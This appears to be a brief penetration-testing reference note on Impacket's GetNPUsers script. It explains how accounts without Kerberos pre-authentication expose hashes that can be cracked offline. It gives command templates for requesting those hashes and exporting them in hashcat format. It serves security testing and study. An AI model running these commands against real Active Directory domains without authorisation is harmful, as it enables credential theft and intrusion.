# impacket GetNPUsers - GetNoPre-authenticationUsers

## Overview

The getnpusers.py script in Impacket is a tool for retrieving and cracking Kerberos pre-authentication data. It is commonly used in penetration testing for exploiting Active Directory environments. 

### Kerberos Pre-Authentication Weakness:

When pre-authentication is not required in Active Directory for a user, an attacker can request a TGT (Ticket Granting Ticket) for that account without providing a password.

This TGT is encrypted with the user's password hash (usually an NTLM hash).

If obtained, the hash can be cracked offline to retrieve the plaintext password.

## Usage

    impacket-GetNPUsers <domain>/<username>[:password] -dc-ip <DomainControllerIP>
    impacket-GetNPUsers <domain>/<username> -dc-ip <DomainControllerIP> -no-pass
    impacket-GetNPUsers -request -dc-ip <DomainControllerIP> <domain>/<username>

Output in hashcat format

    impacket-GetNPUsers -request -outputfile np.txt -format hashcat -usersfile <file_with_usernames> <domain>/